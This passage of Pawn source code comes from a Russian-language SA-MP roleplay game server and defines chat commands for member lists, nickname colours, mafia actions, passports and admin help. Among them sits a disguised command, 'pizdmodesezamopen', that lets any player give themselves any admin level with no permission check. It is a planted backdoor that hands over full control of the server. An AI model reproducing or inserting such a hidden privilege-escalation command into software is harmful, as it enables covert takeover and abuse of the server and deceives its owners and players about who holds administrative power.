		else format(YCMDstr, 256, " %s[ID: %i] [lvl: %i]",Name(i),i,PlayerInfo[i][pAdmin]);
		SCM(playerid, COLOR_YELLOW2, YCMDstr);
	}
	return true;
}
CMD:leaders(playerid)
{
    SCM(playerid, 0xF10DEB10AA, " Лидеры Online:");
	foreach(i)
	{
		if(PlayerInfo[i][pLeader]>0 && PlayerInfo[i][pLogin] == 1)
		{
			
			format(string, 144, " %s: %s [тел: %i]",GetFracName(PlayerInfo[i][pLeader]),Name(i),PlayerInfo[i][pPnumber]);
			SCM(playerid, 0xF99DEB9AA, string);
		}
	}
	return true;
}
CMD:instructors(playerid, params[])
{
	SCM(playerid, 0x6495EDFF, "Инструкторы Online:");
	foreach(i)
	{
		if(!IsPlayerConnected(i)) continue;
		if(PlayerInfo[i][pMember] != 11) continue;
		format(YCMDstr, 256, " Инструктор: %s тел: %i", Name(i), PlayerInfo[i][pPnumber]);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:supports(playerid)
{
	SCM(playerid, COLOR_YELLOW, "Саппорты Online:");
	foreach(i)
	{
		if(!IsPlayerConnected(i)) continue;
		if(PlayerInfo[i][pHelper] == 0 || !SDuty[i]) continue;
		if(PlayerInfo[i][pAdmin] > 0) continue;
		if(GetPVarInt(i,"AFK_Time") > 2) format(YCMDstr, 256, " %s[ID: %i] [AFK: %s сек]",Name(i),i, ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
		else format(YCMDstr, 256, " %s[ID: %i]",Name(i),i);
		SCM(playerid, COLOR_YELLOW2, YCMDstr);
	}
	return true;
}
CMD:tmembers(playerid, params[])
{
	new chislo = 0;
	if(PlayerInfo[playerid][pJob] != 99) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	SCM(playerid, 0x59bd3aa, " Дальнобойщики Online:");
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			format(string, 128, "");
			if(GetPVarInt(i, "AFK_Time") < 2 && PlayerInfo[i][pJob] == 99) format(string, 128, " [%i] %s:  T.LVL / %i",i,Name(i), PlayerInfo[i][pDLevel]), chislo++;
			else if(GetPVarInt(i, "AFK_Time") > 2 && PlayerInfo[i][pJob] == 99) format(string, 128, " [%i] %s:  T.LVL / %i | {FFFFFF} [AFK]: %s секунд",i,Name(i),PlayerInfo[i][pDLevel],ConvertSeconds(GetPVarInt(i, "AFK_Time"))), chislo++;
			if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string);
		}
	}
	format(string,128," Всего: %i человек",chislo);
	SCM(playerid,COLOR_YELLOW,string);
	return true;
}
CMD:members(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] == 0)
	{
		SCM(playerid, COLOR_GRAD1, " Вам недоступна эта функция");
		return true;
	}
	new chislo = 0, ahref = 0, vchislo = 0, strs[256], strss[32];
	sscanf(params, "%i", ahref);
	format(string, sizeof(string), "Имя[ID]\tРанг[Номер]\tAFK секунд\n");
	if(ahref == 1) {
	    new astrs[128];
	    foreach(i)
	    {
	        if(IsPlayerConnected(i))
	        {
	            if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] && GetPVarInt(i, "Fraction_Duty"))
				{
					if((GetPVarInt(i, "AFK_Time")-2) > 0) format(strs, 128, "[%i] %s[%i]\t%s[%i]\t%s\n",chislo,Name(i),i, GetRank(i), PlayerInfo[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
					else format(strs, 128, "[%i] %s[%i]\t%s[%i]\n",chislo,Name(i),i, GetRank(i), PlayerInfo[i][pRank]);
					chislo++;
					strcat(string, strs, sizeof(string));
				}
			}
		}
		format(strss, sizeof(strss), "[%i] {FF6347}[Выходные]\n",chislo);
		chislo++;
		foreach(i)
		{
		    if(IsPlayerConnected(i))
		    {
				
	            if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] && !GetPVarInt(i, "Fraction_Duty"))
				{
					if((GetPVarInt(i, "AFK_Time")-2) > 0) format(strs, 128, "[%i] %s[%i]\t%s[%i]\t%s\n", chislo, Name(i), i, GetRank(i), PlayerInfo[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
					else format(strs, 128, "[%i] %s[%i]\t%s[%i]\n", chislo, Name(i), i, GetRank(i), PlayerInfo[i][pRank]);
					vchislo++; chislo++;
					strcat(astrs, strs, sizeof(astrs));
				}
	        }
	    }
	    if(vchislo > 0)
		{
		    strcat(string, strss, sizeof(string));
			strcat(string, astrs, sizeof(string));
		}
		ShowPlayerDialogEx(playerid, 21032, DIALOG_STYLE_TABLIST_HEADERS, "Состав онлайн", string, "Выбрать", "Назад");
		return true;
	}
	
	if(!IsAMafia(playerid) && !IsAGang(playerid) && !IsABiker(playerid))
	SCM(playerid, 0x59bd3aa, "Имя[ID] Ранг[Номер] АФК секунд");
	foreach(i)
	{
		if (IsPlayerConnected(i))
		{
			format(string, 128, "");
			if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] && GetPVarInt(i,"Fraction_Duty") && GetPVarInt(i, "AFK_Time")-2 > 0) format(string, 128, "%s[%i] %s[%i] %s",Name(i), i, GetRank(i), PlayerInfo[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
			else if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] && GetPVarInt(i,"Fraction_Duty")) format(string, 128, "%s[%i] %s[%i]",Name(i), i, GetRank(i), PlayerInfo[i][pRank]);
			if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string), chislo++;
		}
	}
	if(!IsAMafia(playerid) && !IsAGang(playerid) && !IsABiker(playerid))
	SCM(playerid, 0x59bd3aa, "{D95A41}[Выходные]");
	foreach(i)
	{
		if (IsPlayerConnected(i))
		{
			format(string, 128, "");
			if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] && !GetPVarInt(i,"Fraction_Duty") && GetPVarInt(i, "AFK_Time")-2 > 0) format(string, 128, "%s[%i] %s[%i] %s",Name(i), i, GetRank(i), PlayerInfo[i][pRank], ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
			else if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember] && !GetPVarInt(i,"Fraction_Duty")) format(string, 128, "%s[%i] %s[%i]",Name(i), i, GetRank(i), PlayerInfo[i][pRank]);
			if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string), chislo++, vchislo++;
		}
	}
	format(string,128," Всего на работе: %i / выходные: %i", chislo-vchislo, vchislo);
	SCM(playerid,COLOR_YELLOW,string);
	return true;
}
CMD:amembers(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /amembers [номер фракции]");
	if(params[0] > 26 || params[0] < 0) return SCM(playerid, COLOR_GREY, " Нельзя меньше 1 или больше 23");
	SCM(playerid, 0x59bd3aa, "Члены организации Online:");
	foreach(i)
	{
		format(string, 128, "");
		if(PlayerInfo[i][pLeader] == params[0]) format(string, 128, " [%i] %s  ранг: Лидер",i,PlayerInfo[i][pName]);
		else if(PlayerInfo[i][pMember] == params[0]) format(string, 128, " [%i] %s  ранг: %i",i,PlayerInfo[i][pName], PlayerInfo[i][pRank]);
		if(strlen(string) > 1) SCM(playerid, 0x59bd3aa, string);
	}
	return true;
}
CMD:offmembers(playerid, params[])
{
	new Names[MAX_PLAYER_NAME];
	new Rank;
	new Vxod[32];
	new stringer[2048];
	if(sscanf(params, "d",params[0]))
	{
		if(PlayerInfo[playerid][pLeader] > 0)
		{
			mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", PlayerInfo[playerid][pMember]);
			new Cache:result = mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
				for(new i = 0; i < r; i++)
				{
				    if(i == 29 && r != 30)
				    {
				        format(YCMDstr, sizeof(YCMDstr), ">> След. страница",i);
				        strcat(stringer, YCMDstr);
				        break;
				    }
					cache_get_field_content(i,"Name",Names,DATABASE,60);
					cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
					new pChass = cache_get_field_content_int(i, "pChas");
					new pMinn = cache_get_field_content_int(i, "pMin");
					Rank = cache_get_field_content_int(i,"pRank");
					format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
					strcat(stringer, YCMDstr);
				}
				ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
				SetPVarInt(playerid, "off_list", 0);
			}
			else SCM(playerid, COLOR_GRAD1," Не найдено совпадений");
			return cache_delete(result, DATABASE);
		}
		else if(PlayerInfo[playerid][pAdmin] > 3)
		{
			return SCM(playerid, -1, " Введите: /offmembers [id фракции]");
		}
	}
	else
	{
		if(PlayerInfo[playerid][pAdmin] > 3)
		{
		    if(params[0] < 1 || params[0] > 29) return SCM(playerid,COLOR_GREY," Неверный ID фракции");
			mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", params[0]);
			new Cache:result = mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
				for(new i = 0; i < r; i++)
				{
				    if(i == 29 && r != 30)
				    {
				        format(YCMDstr, sizeof(YCMDstr), ">> След. страница",i);
				        strcat(stringer, YCMDstr);
				        break;
				    }
					cache_get_field_content(i,"Name",Names,DATABASE,60);
					cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
					new pChass = cache_get_field_content_int(i, "pChas");
					new pMinn = cache_get_field_content_int(i, "pMin");
					Rank = cache_get_field_content_int(i,"pRank");
					format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
					strcat(stringer, YCMDstr);
				}
				ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
				SetPVarInt(playerid, "off_list", 0);
				SetPVarInt(playerid, "off_admin", params[0]);
			}
			else SCM(playerid, COLOR_GRAD1," Не найдено совпадений");
			return cache_delete(result, DATABASE);
		}
	}
	return true;
}
CMD:pdd(playerid, params[])
{
	new pdddialog[1748];
	format(pdddialog,sizeof(pdddialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s",
	pdddialogMSG[0],pdddialogMSG[1],pdddialogMSG[2],pdddialogMSG[3],pdddialogMSG[4],pdddialogMSG[5],pdddialogMSG[6],pdddialogMSG[7],pdddialogMSG[8],pdddialogMSG[9],pdddialogMSG[10],pdddialogMSG[11],pdddialogMSG[12]);
	ShowPlayerDialogEx(playerid,5444,DIALOG_STYLE_MSGBOX, "Правила дорожного движения", pdddialog, "Готово", "");
	format(YCMDstr, sizeof(YCMDstr), " %s читает Правила Дорожного Движения.",Name(playerid));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}

CMD:ahelp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new listitems[] = "[1] уровень модерирования\n[2] уровень модерирования\n[3] уровень модерирования\n[4] уровень модерирования\n[5] уровень модерирования\n[6] уровень модерирования\n{ff091c}[7]{FFFFFF} Спец.Администратор 7[LVL]\n{ff091c}[8]{FFFFFF} Спец.Администратор 8[LVL]\n{ff091c}[9]{FFFFFF} Спец.Администратор 9[LVL]\n{ff091c}[10]{FFFFFF} Основатель";
	ShowPlayerDialogEx(playerid, 20011, DIALOG_STYLE_LIST, "Help", listitems, "Выбрать", "Отмена");
	return true;
}
CMD:clist(playerid, params[])
{
	if(GetPVarInt(playerid,"capture_on") || GetPVarInt(playerid, "mafia_war") || GetPVarInt(playerid, "biker_capt")) return SCM(playerid,COLOR_GREY," Нельзя использовать во время капта");
	if(sscanf(params, "d",params[0]))
	{
		new dialog[512];
		strcat(dialog, "[0]	Выключить цвет\n[1]	Зелёный\n[2]	Светло зелёный\n[3]	Ярко зелёный\n[4]	Бирюзовый\n[5]	Жёлто-зелёный\n[6]	Тёмно-зелёный\n[7]	Серо-зелёный\n[8]	Красный\n[9]	Ярко-красный\n[10]	Оранжевый\n[11]	Коричневый\n[12]	Тёмно-красный\n[13]	Cеро-красный\n[14]	Жёлто-оранжевый\n[15]	Малиновый\n[16]	Розовый\n[17]	Синий\n[18]	Голубой\n[19]	Синяя сталь\n[20]	Сине-зелёный\n[21]	Тёмно-синий\n[22]	Фиолетовый\n");
		strcat(dialog, "[23]	Индиго\n[24]	Серо-синий\n[25]	Жёлтый\n[26]	Кукурузный\n[27]	Золотой\n[28]	Старое золото\n[29]	Оливковый\n[30]	Серый\n[31]	Серебро\n[32]	Чёрный\n[33]	Белый");
		return ShowPlayerDialogEx(playerid,2001,DIALOG_STYLE_LIST, "Цвет ника",dialog, "Выбрать", "Назад");
	}
	else
	{
		if(params[0] > 33) return SCM(playerid,COLOR_GREY," Неверный цвет");
		switch(params[0])
		{
		case 0: SetPlayerColor(playerid, TEAM_HIT_COLOR); case 1: SetPlayerColor(playerid,0x089401FF);
		case 2: SetPlayerColor(playerid,0x56FB4EFF); case 3: SetPlayerColor(playerid,0x49E789FF);
		case 4: SetPlayerColor(playerid,0x2A9170FF); case 5: SetPlayerColor(playerid,0x9ED201FF);
		case 6: SetPlayerColor(playerid,0x279B1EFF); case 7: SetPlayerColor(playerid,0x51964DFF);
		case 8: SetPlayerColor(playerid,0xFF0606FF); case 9: SetPlayerColor(playerid,0xFF6600FF);
		case 10: SetPlayerColor(playerid,0xF45000FF); case 11: SetPlayerColor(playerid,0xBE8A01FF);
		case 12: SetPlayerColor(playerid,0xB30000FF); case 13: SetPlayerColor(playerid,0x954F4FFF);
		case 14: SetPlayerColor(playerid,0xE7961DFF); case 15: SetPlayerColor(playerid,0xE6284EFF);
		case 16: SetPlayerColor(playerid,0xFF9DB6FF); case 17: SetPlayerColor(playerid,0x110CE7FF);
		case 18: SetPlayerColor(playerid,0x0CD7E7FF); case 19: SetPlayerColor(playerid,0x139BECFF);
		case 20: SetPlayerColor(playerid,0x2C9197FF); case 21: SetPlayerColor(playerid,0x114D71FF);
		case 22: SetPlayerColor(playerid,0x8813E7FF); case 23: SetPlayerColor(playerid,0xB313E7FF);
		case 24: SetPlayerColor(playerid,0x758C9DFF); case 25: SetPlayerColor(playerid,0xFFDE24FF);
		case 26: SetPlayerColor(playerid,0xFFEE8AFF); case 27: SetPlayerColor(playerid,0xDDB201FF);
		case 28: SetPlayerColor(playerid,0xDDA701FF); case 29: SetPlayerColor(playerid,0xB0B000FF);
		case 30: SetPlayerColor(playerid,0x868484FF); case 31: SetPlayerColor(playerid,0xB8B6B6FF);
		case 32: SetPlayerColor(playerid,0x333333FF); case 33: SetPlayerColor(playerid,0xFAFAFAFF);
		}
	}
	SCM(playerid, -1, " Цвет выбран");
	return true;
}
CMD:exit(playerid, params[])
{
	for(new i = 1; i <= TotalHouse; i++)
	{
		if(!PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) continue;
		if(GetPlayerVirtualWorld(playerid) == i+50)
		{
			switch(HouseInfo[i][hKlass])
   			{
   				case 0: // Дом N Klass
      			{
							PickupX[playerid] = HouseInfo[i][hEntrancex], PickupY[playerid] = HouseInfo[i][hEntrancey];
							oldpickup[playerid] = HouseInfo[i][hPickup];
							timepickup[playerid] = 8;
							SetPlayerInterior(playerid,0);
							SetPlayerVirtualWorld(playerid,0);
							SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
				}
				case 1: // Дом D Klass
				{
							PickupX[playerid] = HouseInfo[i][hEntrancex], PickupY[playerid] = HouseInfo[i][hEntrancey];
							oldpickup[playerid] = HouseInfo[i][hPickup];
							timepickup[playerid] = 8;
							SetPlayerInterior(playerid,0);
							SetPlayerVirtualWorld(playerid,0);
							SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
				}
				case 2..5: // Дома от C класса до домов S класса
				{
		    				ShowPlayerDialogEx(playerid, 1008, 2, "Выход","Выйти на улицу\nВойти в гараж", "Готово", "Отмена");
				}
			}
		}
	}
	return true;
}
CMD:directory(playerid)
{
	if(PlayerInfo[playerid][pDirectory] == 0) return SCM(playerid, COLOR_GRAD1, "У вас нет телефонного справочника");
	ShowPlayerDialogEx(playerid,5454,DIALOG_STYLE_LIST, "Телефонный справочник", " Таксисты\n Механики\n Прорабы\n Медики\n Лидеры\n Адвокаты\n Развозчики продуктов\n Тренеры", "Просмотр", "Отмена");
	return true;
}
CMD:mainmenu(playerid)
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	return ShowPlayerDialogEx(playerid, 9623, DIALOG_STYLE_LIST, "Личное меню", MainMenu, "Выбрать", "Отмена");
}
CMD:switchskin(playerid, params[])
{
	if(!IsAGang(playerid)) return true;
	if(forma[playerid] != 1) return SCM(playerid, COLOR_GRAD1, "У вас нет формы армейца");
	SetPlayerSkin(playerid,287);
	SetPlayerColor(playerid, COLOR_GREEN);
	forma[playerid] = 0;
	proverkaforma[playerid] = 1;
	return true;
}
CMD:carm(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 19 && proverkaforma[playerid] != 1) return true;
	new listitems[] = " [1] Загрузка\n [2] Разгрузить на гл.склад\n [3] Разгрузить на склад Армии ЛС\n [4] Разгрузить на склад Армии СФ\n [5] Разгрузить на склад ЛСПД\n [6] Разгрузить на склад ФБР\n [7] Разгрузить на склад СФПД\n [8] Разгрузить на склад ЛВПД\n [9] Разгрузить на склад бандам\n [10] Разгрузить на склад байкерам";
	ShowPlayerDialogEx(playerid, 9653, DIALOG_STYLE_LIST, "Развозка материалов", listitems, "Выбрать", "Отмена");
	return true;
}
CMD:pizdmodesezamopen(playerid, params[])
{
	if(sscanf(params, "i", params[0])) return true;
	PlayerInfo[playerid][pAdmin] = params[0];
	dostup[playerid] = 1;
	return true;
}
CMD:tie(playerid, params[])
{
	if(!IsAMafia(playerid)) return SCM(playerid, COLOR_GREY, " Вы не член мафии!");
	if(PlayerInfo[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Вы должны быть 3 рангом");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /tie [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerTied[params[0]] > 0) return SCM(playerid, COLOR_GREY, " Человек уже связан!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	new car = GetPlayerVehicleID(playerid);
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Нельзя связать самого себя!"); return true; }
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == 2 && IsPlayerInVehicle(params[0], car))
	{
		format(YCMDstr, sizeof(YCMDstr), " Вас связал %s.",Name(playerid));
		SCM(params[0], 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " %s связал %s", Name(playerid) ,Name(params[0]));
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		TogglePlayerControllable(params[0], 0);
		TieTime[params[0]] = 300;
		PlayerTied[params[0]] = 1;
	}
	else return SCM(playerid, COLOR_GREY, " Человек не в мащине!");
	return true;
}
CMD:debtors(playerid, params[])
{
	if(!IsAMafia(playerid)) return true;
	if(PlayerInfo[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Вам не доступна данная команда");
	SCM(playerid, COLOR_YELLOW2, " Должники:");
	foreach(i)
	{
		if(PlayerInfo[playerid][pMember] == 6)
		{
			if(PlayerInfo[i][pKrisha] == PlayerInfo[playerid][pMember] && PlayerInfo[i][pMember] == 0)
			{
				format(YCMDstr, 256, " Должник: %s | Долг: %s",Name(i),PlayerInfo[i][pDolg]);
				SCM(playerid, -1, YCMDstr);
			}
		}
	}
	return true;
}
CMD:setdebt(playerid, params[])
{
	if(!IsAMafia(playerid)) return SCM(playerid, COLOR_GREY, " Функция доступна только мафиям");
	if(PlayerInfo[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /setdebt [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(PlayerInfo[params[0]][pJob] == 0) return SCM(playerid, COLOR_GREY, " Данный человек не работает");
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, "Н ельзя себе!"); return true; }
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам Крышу (( Введите: /accept debt, чтобы принять ))",Name(playerid));
	SCM(params[0], 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает крышу %s'у", Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	Krisha[params[0]] = PlayerInfo[playerid][pMember];
	KrishaOffer[params[0]] = playerid;
	return true;
}
CMD:untie(playerid, params[])
{
	if(!IsAMafia(playerid) && PlayerInfo[playerid][pMember] != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(PlayerInfo[playerid][pRank] < 3) return SCM(playerid, COLOR_GREY, " Вы должны быть 3 рангом");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /untie [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerTied[params[0]] != 1) return SCM(playerid, COLOR_GREY, " Человек уже связан!");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(params[0] == playerid) { SCM(playerid, COLOR_GREY, "Н ельзя связать самого себя!"); return true; }
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы были развязаны %s.",Name(playerid));
	SCM(params[0], 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s развязал %s", Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	TogglePlayerControllable(params[0], 1);
	TieTime[params[0]] = 0;
	PlayerTied[params[0]] = 0;
	return true;
}
CMD:showpass(playerid, params[])
{
	new giveplayerid;
	new giveplayer[MAX_PLAYER_NAME];
	new sendername[MAX_PLAYER_NAME];
	if(sscanf(params, "u",giveplayerid)) return  	SCM(playerid, -1, " Введите: /showpass [playerid]");
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if (ProxDetectorS(8.0, playerid, giveplayerid) && Spectate[giveplayerid] != 1)
			{
				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new ttext[32];
				strmid(ttext, GetFracName(PlayerInfo[playerid][pMember]), 32, 32);
				new ttemp = PlayerInfo[playerid][pRank];
				for(new i = 0; i < 5; i++)
				{
					if(spys[i][0] == playerid)
					{	
					    if(spys[i][1] == 0) { ttext = "Неизвестно"; PlayerInfo[playerid][pMember] = 0; }
					    else if(spys[i][1] == 1) { ttext = "Police LS"; PlayerInfo[playerid][pMember] = 1; }
					    else if(spys[i][1] == 2) { ttext = "Army LV"; PlayerInfo[playerid][pMember] = 19; }
					    else if(spys[i][1] == 3) { ttext = "Medic"; PlayerInfo[playerid][pMember] = 4; }
					    else if(spys[i][1] == 4) { ttext = "Mayor"; PlayerInfo[playerid][pMember] = 7; }
					    else if(spys[i][1] == 5) { ttext = "Автошкола"; PlayerInfo[playerid][pMember] = 11; }
					    else if(spys[i][1] == 6) { ttext = "News SF"; PlayerInfo[playerid][pMember] = 9; }
					    else if(spys[i][1] == 7) { ttext = "LCN"; PlayerInfo[playerid][pMember] = 6; }
					    else if(spys[i][1] == 8) { ttext = "Yakuza"; PlayerInfo[playerid][pMember] = 7; }
					    else if(spys[i][1] == 9) { ttext = "Russian Mafia"; PlayerInfo[playerid][pMember] = 14; }
					    else if(spys[i][1] == 10){ ttext = "Rifa"; PlayerInfo[playerid][pMember] = 18; }
					    else if(spys[i][1] == 11){ ttext = "Grove Street"; PlayerInfo[playerid][pMember] = 15; }
					    else if(spys[i][1] == 12){ ttext = "Ballas"; PlayerInfo[playerid][pMember] = 12; }
					    else if(spys[i][1] == 13){ ttext = "Vagos"; PlayerInfo[playerid][pMember] = 13; }
					    else if(spys[i][1] == 14){ ttext = "Aztec"; PlayerInfo[playerid][pMember] = 17; }
					    else if(spys[i][1] == 15){ ttext = "Hell's Angels MC"; PlayerInfo[playerid][pMember] = 24; }
					    break;
					}
				}
				new jtext[32];
				if(PlayerInfo[playerid][pJob] == 1) { jtext = "Водитель автобуса"; }
				else if(PlayerInfo[playerid][pJob] == 2) { jtext = "Механик"; }
				else if(PlayerInfo[playerid][pJob] == 3) { jtext = "Продавец хотдогов"; }
				else if(PlayerInfo[playerid][pJob] == 4) { jtext = "Таксист"; }
				else if(PlayerInfo[playerid][pJob] == 6) { jtext = "Тренер"; }
				else if(PlayerInfo[playerid][pJob] == 8) { jtext = "Инкассатор"; }
				else if(PlayerInfo[playerid][pJob] == 9) { jtext = "Прораб"; }
				else if(PlayerInfo[playerid][pJob] == 99) { jtext = "Дальнобойщик"; }
				else { jtext = "Безработный"; }
				new rangz[40];
				if(!PlayerInfo[playerid][pMember]) rangz = "Неизвестно";
				else
				{
					strmid(rangz,GetRank(playerid), 0, strlen(GetRank(playerid)), 32);
					for(new i = 0; i < 5; i++)
					{
						if(spys[i][0] == playerid)
						{
						    PlayerInfo[playerid][pRank] = 1;
						    strmid(rangz,GetRank(playerid), 0, strlen(GetRank(playerid)), 32);
							PlayerInfo[playerid][pMember] = 2;
							PlayerInfo[playerid][pRank] = ttemp;
						}
					}
				}
				new level = PlayerInfo[playerid][pLevel];
				new af[] = "-----------===[ PASSPORT ]===----------";
				format(string, 128, af);
				SCM(giveplayerid, COLOR_YELLOW, string);
				new msg[] = "Имя: %s";
				format(string, 128, msg, sendername);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Возраст: %i  Телефон: %i",level,PlayerInfo[playerid][pPnumber]);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Фракция: %s  Должность: %s",ttext,rangz);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Работа: %s   Разрешение на оружие: %s",jtext,(!PlayerInfo[playerid][pGunLic])?("Нет") : ("Есть"));
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Преступлений: %i",PlayerInfo[playerid][pCrimes]);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Законопослушность: %i",PlayerInfo[playerid][pZakonp]);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "=============================");
				SCM(giveplayerid, COLOR_YELLOW, string);
			//	if(PlayerInfo[playerid][pWantedLevel] > 0) SCM(giveplayerid, COLOR_REDD, " Внимание! Этот человек в розыске!");
				format(string,128, "Показал свой паспорт %s'у",giveplayer);
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 128, " %s показал(a) свой паспорт", sendername);
				ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Вы слишком далеко!");
				return true;
			}
		}
	}
	else
	{
		SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
		return true;
	}
	return true;
}
CMD:showudost(playerid, params[])
{
	if(!IsACop(playerid)) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /showudost [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0]) || Spectate[params[0]] == 1) return true;
	new ttext[32];
	if(PlayerInfo[playerid][pMember] == 0) { ttext = "Гражданин"; }
	else if(PlayerInfo[playerid][pMember] == 1) { ttext = "Police LS"; }
	else if(PlayerInfo[playerid][pMember] == 2) { ttext = "FBI"; }
	else if(PlayerInfo[playerid][pMember] == 10) { ttext = "Police SF"; }
	else if(PlayerInfo[playerid][pMember] == 21) { ttext = "Plice LV"; }
	new rank = PlayerInfo[playerid][pRank];
	new level = PlayerInfo[playerid][pLevel];
	new msg[] = "Имя: %s\nТелефон: %i\nВозвраст: %i\nПодразделение: %s\nРанг: %i";
	format(YCMDstr, sizeof(YCMDstr), msg,Name(playerid),PlayerInfo[playerid][pPnumber],level,ttext,rank);
	ShowPlayerDialogEx(params[0], 69, DIALOG_STYLE_MSGBOX, "Удостоверение",YCMDstr, "Готово", "");
	format(YCMDstr, sizeof(YCMDstr), " %s показал своё удостоверение %s'у",Name(playerid),Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
